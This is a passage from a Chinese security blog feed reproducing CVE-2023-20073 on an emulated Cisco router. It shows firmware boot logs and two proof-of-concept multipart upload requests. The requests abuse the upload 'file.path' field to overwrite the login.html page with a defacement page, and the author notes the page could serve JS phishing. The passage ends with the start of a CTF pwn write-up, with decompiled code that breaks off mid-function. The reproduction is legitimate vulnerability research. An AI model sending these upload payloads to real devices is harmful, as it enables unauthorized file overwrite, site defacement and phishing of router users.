&#x27;</span>/tmp/update.sh<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">uci: Entry not found</span></span><br><span class="line"><span class="string">uci: Entry not found</span></span><br><span class="line"><span class="string">uci: Parse error (option/list command found before the first section) at line 2492, byte 1</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/etc/syslog_config_template&#x27;</span>: No such file or directory</span><br><span class="line">sed: /tmp/syslog-ng.conf: No such file or directory</span><br><span class="line">Error opening configuration file; filename=<span class="string">&#x27;/tmp/syslog-ng.conf&#x27;</span>, error=<span class="string">&#x27;Success (0)&#x27;</span></span><br><span class="line">SIOCGMIIPHY: No such device</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">Failed to parse json data: unexpected end of data</span><br><span class="line">Failed to connect to ubus</span><br><span class="line">0</span><br><span class="line">json_object_from_file: error reading file /tmp/webcache/dep: No such file or directory</span><br><span class="line">PnP Agent is starting!</span><br><span class="line"></span><br><span class="line">uci: Entry not found</span><br><span class="line"></span><br><span class="line">/ <span class="comment"># /etc/init.d/nginx start</span></span><br><span class="line"><span class="built_in">chown</span>: /var/firmware: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/3g-4g-driver: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/in_certs: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/signature: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/language-pack: No such file or directory</span><br><span class="line"><span class="built_in">chown</span>: /var/configuration: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /firewall-basic-settings:firewall/remote-web-management/cert does not exist, <span class="keyword">in</span> <span class="keyword">function</span> do_maapi_get, line 1463</span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">LANGUAGE = (<span class="built_in">unset</span>),</span><br><span class="line">LC_ALL = (<span class="built_in">unset</span>),</span><br><span class="line">LANG = <span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (<span class="string">&quot;C&quot;</span>).</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/tmp/stats/certstats.tmp<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-restconf:ciscosb-restconf/transport/https/cert does not exist, in function do_maapi_get, line 1463</span></span><br><span class="line"><span class="string">touch: /tmp/stats/certstats.tmp: No such file or directory</span></span><br><span class="line"><span class="string">perl: warning: Setting locale failed.</span></span><br><span class="line"><span class="string">perl: warning: Please check that your locale settings:</span></span><br><span class="line"><span class="string">LANGUAGE = (unset),</span></span><br><span class="line"><span class="string">LC_ALL = (unset),</span></span><br><span class="line"><span class="string">LANG = &quot;en_US.UTF-8&quot;</span></span><br><span class="line"><span class="string">    are supported and installed on your system.</span></span><br><span class="line"><span class="string">perl: warning: Falling back to the standard locale (&quot;C&quot;).</span></span><br><span class="line"><span class="string">cp: can&#x27;</span>t <span class="built_in">stat</span> <span class="string">&#x27;/tmp/stats/certstats.tmp&#x27;</span>: No such file or directory</span><br><span class="line">FAILED: maapi_get_elem(ms, mtid, &amp;val, argv[0]), Error: item does not exist (1): /ciscosb-netconf:ciscosb-netconf/transport/ssh/cert does not exist, <span class="keyword">in</span> <span class="keyword">function</span> do_maapi_get, line 1463</span><br><span class="line"><span class="built_in">touch</span>: /tmp/stats/certstats.tmp: No such file or directory</span><br><span class="line">perl: warning: Setting locale failed.</span><br><span class="line">perl: warning: Please check that your locale settings:</span><br><span class="line">LANGUAGE = (<span class="built_in">unset</span>),</span><br><span class="line">LC_ALL = (<span class="built_in">unset</span>),</span><br><span class="line">LANG = <span class="string">&quot;en_US.UTF-8&quot;</span></span><br><span class="line">    are supported and installed on your system.</span><br><span class="line">perl: warning: Falling back to the standard locale (<span class="string">&quot;C&quot;</span>).</span><br><span class="line"><span class="built_in">cp</span>: can<span class="string">&#x27;t stat &#x27;</span>/tmp/stats/certstats.tmp<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/jsonrpc.ini</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/upload.ini</span></span><br><span class="line"><span class="string">[uWSGI] getting INI configuration from /etc/uwsgi/blockpage.ini</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">*** Starting uWSGI 2.0.15 (32bit) on [Sun Aug 11 09:02:03 2024] ***</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">compiled with version: 4.8.3 on 17 October 2022 13:32:49</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">os: Linux-3.2.0-4-vexpress #1 SMP Debian 3.2.51-1</span></span><br><span class="line"><span class="string">nodename: Router</span></span><br><span class="line"><span class="string">machine: armv7l</span></span><br><span class="line"><span class="string">clock source: unix</span></span><br><span class="line"><span class="string">pcre jit disabled</span></span><br><span class="line"><span class="string">detected number of CPU cores: 4</span></span><br><span class="line"><span class="string">current working directory: /</span></span><br><span class="line"><span class="string">detected binary path: /usr/sbin/uwsgi</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setgid() to 33</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">setuid() to 33</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">your processes number limit is 961</span></span><br><span class="line"><span class="string">your memory page size is 4096 bytes</span></span><br><span class="line"><span class="string">detected max file descriptor number: 1024</span></span><br><span class="line"><span class="string">lock engine: pthread robust mutexes</span></span><br><span class="line"><span class="string">thunder lock: disabled (you can enable it with --thunder-lock)</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9001 fd 3</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9000 fd 3</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">uwsgi socket 0 bound to TCP address 127.0.0.1:9003 fd 3</span></span><br><span class="line"><span class="string">mapped 128512 bytes (125 KB) for 1 cores</span></span><br><span class="line"><span class="string">your server socket listen backlog is limited to 100 connections</span></span><br><span class="line"><span class="string">your mercy for graceful operations on workers is 60 seconds</span></span><br><span class="line"><span class="string">*** Operational MODE: single process ***</span></span><br><span class="line"><span class="string">initialized CGI mountpoint: /blocked.php = /www/cgi-bin/blockpage.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5708)</span></span><br><span class="line"><span class="string">mapped 321280 bytes (313 KB) for 4 cores</span></span><br><span class="line"><span class="string">*** Operational MODE: preforking ***</span></span><br><span class="line"><span class="string">initialized CGI mountpoint: /jsonrpc = /www/cgi-bin/jsonrpc.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5707)</span></span><br><span class="line"><span class="string">mapped 128512 bytes (125 KB) for 1 cores</span></span><br><span class="line"><span class="string">*** Operational MODE: single process ***</span></span><br><span class="line"><span class="string">initialized CGI path: /www/cgi-bin/upload.cgi</span></span><br><span class="line"><span class="string">*** no app loaded. going in full dynamic mode ***</span></span><br><span class="line"><span class="string">*** uWSGI is running in multiple interpreter mode ***</span></span><br><span class="line"><span class="string">spawned uWSGI master process (pid: 5709)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5718, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5719, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 2 (pid: 5721, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 1 (pid: 5720, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 3 (pid: 5722, cores: 1)</span></span><br><span class="line"><span class="string">spawned uWSGI worker 4 (pid: 5723, cores: 1)</span></span><br></pre></td></tr></table></figure><h1 id="漏洞的利用"><a href="#漏洞的利用" class="headerlink" title="漏洞的利用"></a>漏洞的利用</h1><h2 id="Poc1"><a href="#Poc1" class="headerlink" title="Poc1"></a>Poc1</h2><p>此时能够覆盖一个.html文件，那么html文件可以通过js来钓鱼，但是视觉效果没那么好，因此就写一个小页面吧</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331165.png" alt="image-20240811230535572"></p><p>到最后会执行<code>mv -f /tmp/upload/0000000001 /tmp/www//login.html</code>便是复现成功了</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file.path&quot;</span><br><span class="line"></span><br><span class="line">/tmp/upload/0000000001</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;what&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Apple Style Ad<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: -apple-system, BlinkMacSystemFont, <span class="string">&quot;Segoe UI&quot;</span>, Roboto, <span class="string">&quot;Helvetica Neue&quot;</span>, Arial, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: flex;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">justify-content</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">align-items</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">height</span>: <span class="number">100vh</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f5f5f7</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">4px</span> <span class="number">12px</span> <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-image</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">8px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-title</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">20px</span> <span class="number">0</span> <span class="number">10px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-description</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-size</span>: <span class="number">1.2em</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#666</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-button</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">display</span>: inline-block;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">10px</span> <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#0071e3</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#fff</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">6px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-decoration</span>: none;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.ad-button</span><span class="selector-pseudo">:hover</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#005bb5</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;your-image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Product Image&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ad-image&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-title&quot;</span>&gt;</span>Hacked by s1nec-1o!!!!!!!!!!!!!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;ad-description&quot;</span>&gt;</span>welcome to iot world !!!!!!!!!!!!<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://s1nec-1o.github.io/&quot;</span> <span class="attr">class</span>=<span class="string">&quot;ad-button&quot;</span>&gt;</span>click me<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------------</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331166.png" alt="image-20240811231158839"></p><h2 id="Poc2"><a href="#Poc2" class="headerlink" title="Poc2"></a>Poc2</h2><p>winmt师傅还有一种Poc可以更加的优雅来控制file.path，其实报文会根据配置文件来自动来添加一个 <code>xxx.path</code></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408112331167.png" alt="image-20240811232236329"></p><blockquote><ul><li>$upload_field_name  原始的文件字段</li><li>$upload_content_type 上传文件的类型</li><li>$upload_file_name 客户端上传的原始文件名称</li><li>$upload_tmp_path 上传的文件保存在服务端的位置</li></ul></blockquote><p>因此会把原始字段的名称先赋成上传文件的名称，然后上传文件的名称.path就会记录在上传的位置，即&#x2F;tmp&#x2F;upload&#x2F;0000000001，因此可以用更优雅的方式进行利用</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;pathparam&quot;</span><br><span class="line"></span><br><span class="line">Portal</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileparam&quot;</span><br><span class="line"></span><br><span class="line">login.html</span><br><span class="line">------------</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;;filename=&quot;login.html&quot;;Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>The website has been hacked!<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;The website has been hacked&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">------------</span><br></pre></td></tr></table></figure><h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这算是第二次复现了，第一次了了收场，还有好多东西没搞懂，这次一次性给他弄懂了，想来一步一步做下来，IoT小白(我)也是能收获满满的</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://zikh26.github.io/posts/848296ab.html">ZIKH26</a></p><p><a href="https://blog.csdn.net/zzhongcy/article/details/88863037">https://blog.csdn.net/zzhongcy/article/details/88863037</a></p><p><a href="https://www.cnblogs.com/54chensongxia/p/12938929.html">https://www.cnblogs.com/54chensongxia/p/12938929.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2023-20073&quot;&gt;&lt;a href=&quot;#CVE-2023-20073&quot; class=&quot;headerlink&quot; title=&quot;CVE-2023-20073&quot;&gt;&lt;/a&gt;CVE-2023-20073&lt;/h1&gt;&lt;h1 id=&quot;提取固件&quot;&gt;&lt;a href=&quot;#提</summary>
      
    
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/"/>
    
    <category term="漏洞复现" scheme="http://s1nec-1o.github.io/categories/IOT%E5%AE%89%E5%85%A8/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="IOT安全" scheme="http://s1nec-1o.github.io/tags/IOT%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>2024ciscn华东南pwn</title>
    <link href="http://s1nec-1o.github.io/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/"/>
    <id>http://s1nec-1o.github.io/2024/08/07/2024ciscn%E5%8D%8E%E4%B8%9C%E5%8D%97pwn/</id>
    <published>2024-08-07T02:21:24.000Z</published>
    <updated>2024-08-07T02:44:03.927Z</updated>
    
    <content type="html"><![CDATA[<p>比赛的时候全靠fix得分，也是参与上了</p><h1 id="baby-jit"><a href="#baby-jit" class="headerlink" title="baby_jit"></a>baby_jit</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">8</span>]; <span class="comment">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  heap = <span class="built_in">malloc</span>(<span class="number">8LL</span> * (count + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">sandbox</span>();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;1. Add\n2. Exec\n3. Exit\n&gt;&gt; &quot;</span>);</span><br><span class="line">      <span class="built_in">fgets</span>(s, <span class="number">8</span>, stdin);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;1\n&quot;</span>) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="built_in">add</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s, <span class="string">&quot;2\n&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bye &quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exec</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是一个沙盒，然后有两个功能一个Exec和一个Add函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = <span class="built_in">malloc</span>(<span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">fgets</span>((<span class="type">char</span> *)s, <span class="number">0x30</span>, stdin);</span><br><span class="line">  *((_QWORD *)heap + count++) = s;</span><br><span class="line">  dest = <span class="built_in">malloc</span>(<span class="number">8LL</span> * (count + <span class="number">1</span>));</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, heap, <span class="number">8LL</span> * count);</span><br><span class="line">  <span class="built_in">free</span>(heap);</span><br><span class="line">  result = dest;</span><br><span class="line">  heap = dest;</span><br><span class="line">  <span 